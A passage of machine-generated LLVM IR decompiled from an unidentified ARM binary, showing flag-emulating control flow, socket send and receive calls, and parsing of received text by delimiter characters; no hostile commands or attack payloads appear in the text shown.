  %v2_9950 = icmp eq i32 %v3_9948, 0
  store i1 %v2_9950, i1* %cpsr_z.global-to-local, align 1
  %v0_9954 = load i32, i32* @r5, align 4
  %tmp207 = icmp slt i32 %v3_9948, 1
  br i1 %tmp207, label %dec_label_pc_99b8, label %dec_label_pc_995c

dec_label_pc_995c:                                ; preds = %dec_label_pc_9930, %dec_label_pc_995c
  %stack_var_-40.8 = phi i32 [ %v1_99a8, %dec_label_pc_995c ], [ %v0_9954, %dec_label_pc_9930 ]
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9960 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_9970 = and i32 %stack_var_-40.8, 33554432
  %v2_9970 = icmp ne i32 %v1_9970, 0
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  %v3_9970 = mul i32 %stack_var_-40.8, 128
  %v1_9974 = add i32 %v3_9970, 1472
  %v2_9978 = add i32 %v2_9960, %stack_var_-20856.0.ph
  store i32 %v2_9978, i32* @r0, align 4
  %v0_997c = load i32, i32* @r7, align 4
  %v2_997c = add i32 %v1_9974, %v0_997c
  store i32 %v2_997c, i32* %r1.global-to-local, align 4
  %v2_9980 = inttoptr i32 %v2_9978 to i8*
  %v3_9980 = call i32 @function_13a30(i8* %v2_9980, i32 %v2_997c)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9988 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1437c.93 to i32), i32* %r1.global-to-local, align 4
  %v2_9994 = add i32 %v2_9988, %stack_var_-20856.0.ph
  store i32 %v2_9994, i32* @r0, align 4
  %v3_9998 = inttoptr i32 %v2_9994 to i8*
  %v4_9998 = call i32 @function_13a30(i8* %v3_9998, i32 ptrtoint ([3 x i8]* @global_var_1437c.93 to i32))
  store i32 %v4_9998, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %stack_var_-40.8, i32* %r3.global-to-local, align 4
  %v0_99a4 = load i32, i32* @r6, align 4
  %v1_99a4 = add i32 %v0_99a4, 37
  %v2_99a4 = inttoptr i32 %v1_99a4 to i32*
  %v3_99a4 = load i32, i32* %v2_99a4, align 4
  store i32 %v3_99a4, i32* %r2.global-to-local, align 4
  %v1_99a8 = add i32 %stack_var_-40.8, 1
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v2_99ac = sub i32 %v3_99a4, %v1_99a8
  %v3_99ac = icmp uge i32 %v3_99a4, %v1_99a8
  store i1 %v3_99ac, i1* %cpsr_c.global-to-local, align 1
  %v4_99ac = xor i32 %v3_99a4, %v1_99a8
  %v5_99ac = xor i32 %v2_99ac, %v3_99a4
  %v6_99ac = and i32 %v5_99ac, %v4_99ac
  %v7_99ac = icmp slt i32 %v6_99ac, 0
  store i1 %v7_99ac, i1* %cpsr_v.global-to-local, align 1
  %v8_99ac = icmp slt i32 %v2_99ac, 0
  store i1 %v8_99ac, i1* %cpsr_n.global-to-local, align 1
  %v9_99ac = icmp eq i32 %v3_99a4, %v1_99a8
  store i1 %v9_99ac, i1* %cpsr_z.global-to-local, align 1
  %v8_99b4 = icmp sgt i32 %v3_99a4, %v1_99a8
  br i1 %v8_99b4, label %dec_label_pc_995c, label %dec_label_pc_99b8

dec_label_pc_99b8:                                ; preds = %dec_label_pc_995c, %dec_label_pc_9930
  %stack_var_-40.9 = phi i32 [ %v0_9954, %dec_label_pc_9930 ], [ %v1_99a8, %dec_label_pc_995c ]
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99bc = call i32 @function_13a08(i8* %v1_9698)
  %v2_99c4 = add i32 %v2_99bc, %stack_var_-20856.0.ph
  store i32 %v2_99c4, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v3_99cc = inttoptr i32 %v2_99c4 to i8*
  %v4_99cc = call i32 @function_13a30(i8* %v3_99cc, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_9924, %dec_label_pc_99b8
  %stack_var_-40.10 = phi i32 [ %stack_var_-40.3, %dec_label_pc_9924 ], [ %stack_var_-40.9, %dec_label_pc_99b8 ]
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99d4 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r1.global-to-local, align 4
  %v2_99e0 = add i32 %v2_99d4, %stack_var_-20856.0.ph
  store i32 %v2_99e0, i32* @r0, align 4
  %v3_99e4 = inttoptr i32 %v2_99e0 to i8*
  %v4_99e4 = call i32 @function_13a30(i8* %v3_99e4, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32))
  store i32 %v4_99e4, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_99ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_99ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99ec, label %dec_label_pc_9a0c, label %dec_label_pc_99f4

dec_label_pc_99f4:                                ; preds = %dec_label_pc_99d0
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99f8 = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v2_9a04 = add i32 %v2_99f8, %stack_var_-20856.0.ph
  store i32 %v2_9a04, i32* @r0, align 4
  %v2_9a08 = inttoptr i32 %v2_9a04 to i8*
  %v3_9a08 = call i32 @function_13a30(i8* %v2_9a08, i32 %v6_8f58)
  store i32 %v3_9a08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_99d0, %dec_label_pc_99f4
  %v0_9a0c = load i32, i32* @r7, align 4
  %v1_9a0c = add i32 %v0_9a0c, 1440
  store i32 %v1_9a0c, i32* %r4.global-to-local, align 4
  %v0_9a10 = load i32, i32* @r6, align 4
  store i32 %v0_9a10, i32* %r0.global-to-local, align 4
  store i32 %v1_9a0c, i32* %r1.global-to-local, align 4
  %v2_9a18 = inttoptr i32 %v0_9a10 to i8*
  %v3_9a18 = call i32 @function_13de8(i8* %v2_9a18, i32 %v1_9a0c)
  store i32 %v3_9a18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a1c = icmp slt i32 %v3_9a18, 0
  store i1 %v1_9a1c, i1* %cpsr_n.global-to-local, align 1
  %v2_9a1c = icmp eq i32 %v3_9a18, 0
  store i1 %v2_9a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a1c, label %dec_label_pc_a364, label %dec_label_pc_9a24

dec_label_pc_9a24:                                ; preds = %dec_label_pc_9a0c, %dec_label_pc_a364
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r6, align 4
  %v1_9a28 = add i32 %v0_9a28, -1431
  %v2_9a28 = inttoptr i32 %v1_9a28 to i32*
  %v3_9a28 = load i32, i32* %v2_9a28, align 4
  store i32 %v3_9a28, i32* @r4, align 4
  %v2_9a2c = call i32 @function_13a08(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_9a2c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9a3c = load i32, i32* @r4, align 4
  store i32 %v0_9a3c, i32* %r0.global-to-local, align 4
  %v0_9a40 = call i32 @_send()
  store i32 %v0_9a40, i32* %r0.global-to-local, align 4
  %v0_9a44 = load i32, i32* @r6, align 4
  %v1_9a44 = add i32 %v0_9a44, -1431
  %v2_9a44 = inttoptr i32 %v1_9a44 to i32*
  %v3_9a44 = load i32, i32* %v2_9a44, align 4
  store i32 %v3_9a44, i32* %r0.global-to-local, align 4
  %v3_9a4c = udiv i32 %v3_9a44, 32
  %v3_9a50 = mul nuw nsw i32 %v3_9a4c, 4
  store i32 %v2_9a54, i32* %lr.global-to-local, align 4
  %v2_9a58 = add i32 %v3_9a50, %v2_9a54
  store i32 %v2_9a58, i32* %r3.global-to-local, align 4
  %v1_9a5c = add i32 %v2_9a58, -164
  %v2_9a5c = inttoptr i32 %v1_9a5c to i32*
  %v3_9a5c = load i32, i32* %v2_9a5c, align 4
  %v1_9a60 = urem i32 %v3_9a44, 32
  %v1_9a64 = load i32, i32* %fp.global-to-local, align 4
  %v7_9a64 = shl i32 %v1_9a64, %v1_9a60
  %v8_9a64 = or i32 %v7_9a64, %v3_9a5c
  store i32 %v8_9a64, i32* %r2.global-to-local, align 4
  %v0_9a68 = load i32, i32* @sl, align 4
  %v2_9a68 = sub i32 %v0_9a68, %v3_9a44
  %v3_9a68 = icmp uge i32 %v0_9a68, %v3_9a44
  store i1 %v3_9a68, i1* %cpsr_c.global-to-local, align 1
  %v4_9a68 = xor i32 %v0_9a68, %v3_9a44
  %v5_9a68 = xor i32 %v2_9a68, %v0_9a68
  %v6_9a68 = and i32 %v5_9a68, %v4_9a68
  %v7_9a68 = icmp slt i32 %v6_9a68, 0
  store i1 %v7_9a68, i1* %cpsr_v.global-to-local, align 1
  %v8_9a68 = icmp slt i32 %v2_9a68, 0
  store i1 %v8_9a68, i1* %cpsr_n.global-to-local, align 1
  %v9_9a68 = icmp eq i32 %v0_9a68, %v3_9a44
  store i1 %v9_9a68, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_9a64, i32* %v2_9a5c, align 4
  %v0_9a74 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a74 = load i32, i32* @r6, align 4
  %v2_9a74 = add i32 %v1_9a74, -1419
  %v3_9a74 = inttoptr i32 %v2_9a74 to i32*
  store i32 %v0_9a74, i32* %v3_9a74, align 4
  %v0_9a78 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a78 = trunc i32 %v0_9a78 to i8
  %v2_9a78 = load i32, i32* @r6, align 4
  %v3_9a78 = add i32 %v2_9a78, -1427
  %v4_9a78 = inttoptr i32 %v3_9a78 to i8*
  store i8 %v1_9a78, i8* %v4_9a78, align 1
  %v0_9a7c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_9a7c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_9a7c = xor i1 %v0_9a7c, %v1_9a7c
  br i1 %v2_9a7c, label %dec_label_pc_9a80, label %dec_label_pc_9388

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a24
  %v0_9a80 = load i32, i32* %r0.global-to-local, align 4
  %v1_9a80 = add i32 %v0_9a80, 1
  store i32 %v1_9a80, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9360
  %v1_9a88 = add i32 %v3_9658, -1431
  %v2_9a88 = inttoptr i32 %v1_9a88 to i32*
  %v3_9a88 = load i32, i32* %v2_9a88, align 4
  store i32 %v3_9a88, i32* %r0.global-to-local, align 4
  %v3_9a90 = udiv i32 %v3_9a88, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9a94 = mul nuw nsw i32 %v3_9a90, 4
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v2_9a9c = add i32 %v3_9a94, %v2_9a54
  store i32 %v2_9a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %.thread22, %.thread33, %dec_label_pc_9a88
  %v1_9aac = phi i32 [ %v4_9344, %.thread33 ], [ %v4_9324, %.thread22 ], [ %v3_9a88, %dec_label_pc_9a88 ]
  %v1_9ab0 = phi i32 [ %v3_9358, %.thread33 ], [ %v3_9338, %.thread22 ], [ %v2_9a9c, %dec_label_pc_9a88 ]
  %v1_9aa0 = add i32 %v1_9ab0, -164
  %v2_9aa0 = inttoptr i32 %v1_9aa0 to i32*
  %v3_9aa0 = load i32, i32* %v2_9aa0, align 4
  %v1_9aa4 = urem i32 %v1_9aac, 32
  store i32 %v1_9aa4, i32* %r1.global-to-local, align 4
  %v1_9aa8 = load i32, i32* %fp.global-to-local, align 4
  %v7_9aa8 = shl i32 %v1_9aa8, %v1_9aa4
  %v8_9aa8 = or i32 %v7_9aa8, %v3_9aa0
  store i32 %v8_9aa8, i32* %r2.global-to-local, align 4
  %v0_9aac = load i32, i32* @sl, align 4
  %v2_9aac = sub i32 %v0_9aac, %v1_9aac
  %v3_9aac = icmp uge i32 %v0_9aac, %v1_9aac
  store i1 %v3_9aac, i1* %cpsr_c.global-to-local, align 1
  %v4_9aac = xor i32 %v0_9aac, %v1_9aac
  %v5_9aac = xor i32 %v2_9aac, %v0_9aac
  %v6_9aac = and i32 %v5_9aac, %v4_9aac
  %v7_9aac = icmp slt i32 %v6_9aac, 0
  store i1 %v7_9aac, i1* %cpsr_v.global-to-local, align 1
  %v8_9aac = icmp slt i32 %v2_9aac, 0
  store i1 %v8_9aac, i1* %cpsr_n.global-to-local, align 1
  %v9_9aac = icmp eq i32 %v0_9aac, %v1_9aac
  store i1 %v9_9aac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9aa8, i32* %v2_9aa0, align 4
  %v2_9ab4 = xor i1 %v8_9aac, %v7_9aac
  br i1 %v2_9ab4, label %dec_label_pc_9ab8, label %dec_label_pc_9388

dec_label_pc_9ab8:                                ; preds = %dec_label_pc_9aa0
  %v0_9ab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_9ab8 = add i32 %v0_9ab8, 1
  store i32 %v1_9ab8, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9310
  %v1_9ac0 = add i32 %v3_9658, -1423
  %v2_9ac0 = inttoptr i32 %v1_9ac0 to i32*
  %v3_9ac0 = load i32, i32* %v2_9ac0, align 4
  %v1_9ac4 = load i32, i32* %sb.global-to-local, align 4
  %v2_9ac4 = sub i32 %v1_9ac4, %v3_9ac0
  store i32 %v2_9ac4, i32* %r3.global-to-local, align 4
  %v1_9ac8 = add i32 %v2_9ac4, -30
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 29
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ac8 = sub i32 29, %v2_9ac4
  %v4_9ac8 = and i32 %v3_9ac8, %v2_9ac4
  %v5_9ac8 = icmp slt i32 %v4_9ac8, 0
  store i1 %v5_9ac8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ac8 = icmp slt i32 %v1_9ac8, 0
  store i1 %v6_9ac8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 30
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v2_9acc = xor i1 %v7_9ac8, true
  %v3_9acc = and i1 %v2_9ac8, %v2_9acc
  br i1 %v3_9acc, label %dec_label_pc_9370, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ac0
  %v1_9ad0 = add i32 %v3_9658, -1431
  %v2_9ad0 = inttoptr i32 %v1_9ad0 to i32*
  %v3_9ad0 = load i32, i32* %v2_9ad0, align 4
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v3_9ad8 = udiv i32 %v3_9ad0, 32
  %v3_9adc = mul nuw nsw i32 %v3_9ad8, 4
  store i32 %v2_9a54, i32* %r1.global-to-local, align 4
  %v2_9ae4 = add i32 %v3_9adc, %v2_9a54
  store i32 %v2_9ae4, i32* %r3.global-to-local, align 4
  %v1_94a8 = add i32 %v2_9ae4, -292
  %v2_94a8 = inttoptr i32 %v1_94a8 to i32*
  %v3_94a8 = load i32, i32* %v2_94a8, align 4
  %v1_94ac = urem i32 %v3_9ad0, 32
  store i32 %v1_94ac, i32* %r1.global-to-local, align 4
  %v1_94b0 = load i32, i32* %fp.global-to-local, align 4
  %v7_94b0 = shl i32 %v1_94b0, %v1_94ac
  %v8_94b0 = or i32 %v7_94b0, %v3_94a8
  store i32 %v8_94b0, i32* %r2.global-to-local, align 4
  %v0_94b4 = load i32, i32* @sl, align 4
  %v2_94b4 = sub i32 %v0_94b4, %v3_9ad0
  %v3_94b4 = icmp uge i32 %v0_94b4, %v3_9ad0
  store i1 %v3_94b4, i1* %cpsr_c.global-to-local, align 1
  %v4_94b4 = xor i32 %v0_94b4, %v3_9ad0
  %v5_94b4 = xor i32 %v2_94b4, %v0_94b4
  %v6_94b4 = and i32 %v5_94b4, %v4_94b4
  %v7_94b4 = icmp slt i32 %v6_94b4, 0
  store i1 %v7_94b4, i1* %cpsr_v.global-to-local, align 1
  %v8_94b4 = icmp slt i32 %v2_94b4, 0
  store i1 %v8_94b4, i1* %cpsr_n.global-to-local, align 1
  %v9_94b4 = icmp eq i32 %v0_94b4, %v3_9ad0
  store i1 %v9_94b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_94b0, i32* %v2_94a8, align 4
  %v2_94bc = xor i1 %v8_94b4, %v7_94b4
  br i1 %v2_94bc, label %dec_label_pc_94c0, label %dec_label_pc_9388

dec_label_pc_9b28:                                ; preds = %dec_label_pc_9574
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9b30 = call i32 @function_13aa8(i32 %v2_8fd8, i32 10240)
  store i32 %v2_9b30, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9b3c = load i32, i32* @r8, align 4
  %v1_9b3c = add i32 %v0_9b3c, -1456
  %v2_9b3c = inttoptr i32 %v1_9b3c to i32*
  %v3_9b3c = load i32, i32* %v2_9b3c, align 4
  store i32 %v3_9b3c, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9b48 = call i32 @_recv(i32 %v3_9b3c, i32 %v2_8fd8, i32 10240, i32 16386)
  store i32 %v4_9b48, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b50 = icmp slt i32 %v4_9b48, 0
  store i1 %v1_9b50, i1* %cpsr_n.global-to-local, align 1
  %v2_9b50 = icmp eq i32 %v4_9b48, 0
  store i1 %v2_9b50, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp208 = icmp slt i32 %v4_9b48, 1
  br i1 %tmp208, label %dec_label_pc_a7d4, label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b28
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9b6c = call i32 @function_13acc(i32 %v2_8fd8, i32 %v4_9b48, i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), i32 4)
  store i32 %v5_9b6c, i32* %r0.global-to-local, align 4
  %v1_9b70 = add i32 %v5_9b6c, 1
  %v2_9b70 = icmp eq i32 %v5_9b6c, -1
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v3_9b70 = sub i32 0, %v5_9b6c
  %v4_9b70 = and i32 %v1_9b70, %v3_9b70
  %v5_9b70 = icmp slt i32 %v4_9b70, 0
  store i1 %v5_9b70, i1* %cpsr_v.global-to-local, align 1
  %v6_9b70 = icmp slt i32 %v1_9b70, 0
  store i1 %v6_9b70, i1* %cpsr_n.global-to-local, align 1
  %v7_9b70 = icmp eq i32 %v1_9b70, 0
  store i1 %v7_9b70, i1* %cpsr_z.global-to-local, align 1
  %v0_a66c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_9b70, label %dec_label_pc_a66c, label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %dec_label_pc_9b5c, %dec_label_pc_a66c
  store i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_a66c, i32* %r1.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_9b88 = call i32 @function_13acc(i32 %v2_8fd8, i32 %v0_a66c, i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), i32 4)
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v2_9b94 = add i32 %v5_9b88, %v2_9a54
  store i32 %v2_9b94, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_9b9c = load i32, i32* @r6, align 4
  %v4_9b9c = add i32 %v3_9b9c, %v2_9b94
  %v5_9b9c = inttoptr i32 %v4_9b9c to i8*
  store i8 0, i8* %v5_9b9c, align 1
  %v0_9ba0 = load i32, i32* @r5, align 4
  store i32 %v0_9ba0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9ba8 = inttoptr i32 %v0_9ba0 to i32*
  %v3_9ba8 = call i32 @function_13000(i32 46, i32* %v2_9ba8)
  %v0_9bac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bac, i32* @r1, align 4
  store i32 %v3_9ba8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9bb8 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9bac, i32 %v3_9ba8)
  store i32 %v4_9bb8, i32* %r0.global-to-local, align 4
  %v1_9bbc = add i32 %v4_9bb8, 1
  %v2_9bbc = icmp eq i32 %v4_9bb8, -1
  store i1 %v2_9bbc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bbc = sub i32 0, %v4_9bb8
  %v4_9bbc = and i32 %v1_9bbc, %v3_9bbc
  %v5_9bbc = icmp slt i32 %v4_9bbc, 0
  store i1 %v5_9bbc, i1* %cpsr_v.global-to-local, align 1
  %v6_9bbc = icmp slt i32 %v1_9bbc, 0
  store i1 %v6_9bbc, i1* %cpsr_n.global-to-local, align 1
  %v7_9bbc = icmp eq i32 %v1_9bbc, 0
  store i1 %v7_9bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bbc, label %.thread43, label %bb209

bb209:                                            ; preds = %dec_label_pc_9b78
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9bc4 = load i32, i32* @r8, align 4
  %v3_9bc4 = add i32 %v2_9bc4, -4
  %v4_9bc4 = inttoptr i32 %v3_9bc4 to i32*
  store i32 2, i32* %v4_9bc4, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_9b78, %bb209
  %v0_9bc8 = load i32, i32* @r5, align 4
  store i32 %v0_9bc8, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9bd0 = inttoptr i32 %v0_9bc8 to i32*
  %v3_9bd0 = call i32 @function_13000(i32 45, i32* %v2_9bd0)
  %v0_9bd4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bd4, i32* @r1, align 4
  store i32 %v3_9bd0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9be0 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9bd4, i32 %v3_9bd0)
  store i32 %v4_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = add i32 %v4_9be0, 1
  %v2_9be4 = icmp eq i32 %v4_9be0, -1
  store i1 %v2_9be4, i1* %cpsr_c.global-to-local, align 1
  %v3_9be4 = sub i32 0, %v4_9be0
  %v4_9be4 = and i32 %v1_9be4, %v3_9be4
  %v5_9be4 = icmp slt i32 %v4_9be4, 0
  store i1 %v5_9be4, i1* %cpsr_v.global-to-local, align 1
  %v6_9be4 = icmp slt i32 %v1_9be4, 0
  store i1 %v6_9be4, i1* %cpsr_n.global-to-local, align 1
  %v7_9be4 = icmp eq i32 %v1_9be4, 0
  store i1 %v7_9be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9be4, label %.thread44, label %bb210

bb210:                                            ; preds = %.thread43
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9bec = load i32, i32* @r8, align 4
  %v3_9bec = add i32 %v2_9bec, -4
  %v4_9bec = inttoptr i32 %v3_9bec to i32*
  store i32 1, i32* %v4_9bec, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb210
  %v0_9bf0 = load i32, i32* @r5, align 4
  store i32 %v0_9bf0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_9bf8 = load i32, i32* @r8, align 4
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  store i32 %v0_9bf0, i32* %v2_9bf8, align 4
  %v2_9bfc = inttoptr i32 %v0_9bf0 to i32*
  %v3_9bfc = call i32 @function_13000(i32 44, i32* %v2_9bfc)
  %v0_9c00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c00, i32* @r1, align 4
  store i32 %v3_9bfc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c0c = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9c00, i32 %v3_9bfc)
  store i32 %v4_9c0c, i32* %r0.global-to-local, align 4
  %v1_9c10 = add i32 %v4_9c0c, 1
  %v2_9c10 = icmp eq i32 %v4_9c0c, -1
  store i1 %v2_9c10, i1* %cpsr_c.global-to-local, align 1
  %v3_9c10 = sub i32 0, %v4_9c0c
  %v4_9c10 = and i32 %v1_9c10, %v3_9c10
  %v5_9c10 = icmp slt i32 %v4_9c10, 0
  store i1 %v5_9c10, i1* %cpsr_v.global-to-local, align 1
  %v6_9c10 = icmp slt i32 %v1_9c10, 0
  store i1 %v6_9c10, i1* %cpsr_n.global-to-local, align 1
  %v7_9c10 = icmp eq i32 %v1_9c10, 0
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c10, label %.thread45, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %.thread44
  %v0_9c18 = load i32, i32* @r5, align 4
  store i32 %v0_9c18, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_9c20 = inttoptr i32 %v0_9c18 to i32*
  %v3_9c20 = call i32 @function_13000(i32 44, i32* %v2_9c20)
  %v0_9c24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c24, i32* @r1, align 4
  store i32 %v3_9c20, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c30 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9c24, i32 %v3_9c20)
  store i32 %v4_9c30, i32* %r0.global-to-local, align 4
  store i32 %v2_9a54, i32* %lr.global-to-local, align 4
  %v2_9c3c = add i32 %v4_9c30, %v2_9a54
  store i32 %v2_9c3c, i32* %r3.global-to-local, align 4
  %v1_9c40 = load i32, i32* @r6, align 4
  %v2_9c40 = add i32 %v1_9c40, %v2_9c3c
  %v3_9c40 = inttoptr i32 %v2_9c40 to i8*
  %v4_9c40 = load i8, i8* %v3_9c40, align 1
  %v2_9c48 = icmp ugt i8 %v4_9c40, 31
  store i1 %v2_9c48, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c48 = icmp ult i8 %v4_9c40, 32
  store i1 %v6_9c48, i1* %cpsr_n.global-to-local, align 1
  %v7_9c48 = icmp eq i8 %v4_9c40, 32
  store i1 %v7_9c48, i1* %cpsr_z.global-to-local, align 1
  %v2_9c50 = zext i1 %v7_9c48 to i32
  %v2_9c50.v4_9c30 = add i32 %v2_9c50, %v4_9c30
  store i32 %v2_9c50.v4_9c30, i32* @r4, align 4
  %v2_9c54 = add i32 %v2_9c50.v4_9c30, %v2_8fd8
  store i32 %v2_9c54, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c54, i32* %r0.global-to-local, align 4
  %v1_9c60 = load i32, i32* %fp.global-to-local, align 4
  %v2_9c60 = sub i32 %v1_9c60, %v2_9c50.v4_9c30
  store i32 %v2_9c60, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9c68 = call i32 @function_13acc(i32 %v2_9c54, i32 %v2_9c60, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_9c68, i32* %r0.global-to-local, align 4
  %v1_9c6c = add i32 %v5_9c68, 1
  %v2_9c6c = icmp eq i32 %v5_9c68, -1
  store i1 %v2_9c6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9c6c = sub i32 0, %v5_9c68
  %v4_9c6c = and i32 %v1_9c6c, %v3_9c6c
